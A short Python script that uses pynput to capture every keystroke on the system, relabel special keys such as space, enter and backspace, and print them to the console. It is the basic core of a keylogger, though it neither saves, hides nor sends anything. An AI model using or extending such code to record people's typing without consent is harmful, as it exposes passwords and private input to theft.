from pynput.keyboard import Listener


# Define a keystroke 
def keystroke(key):
    key = str(key).replace("'", "")

    # Create rules for special characters (keys with Powers)
    if key == 'Key.space':
        key = '[SPACE]'
    
    if key == "Key.shift_r":
        key = "[SHIFT RIGHT]"
    
    if key == "Key.tab":
        key = "[TAB]"

    if key == "Key.enter":
        key = "[ENTER]"

    if key == "Key.backspace":
        key = "[BACKSPACE]"
    
    if key == "Key.caps_lock":
        key = "[CAPS LOCK]"
    print(key)

with Listener(on_press=keystroke) as listener:
    listener.join()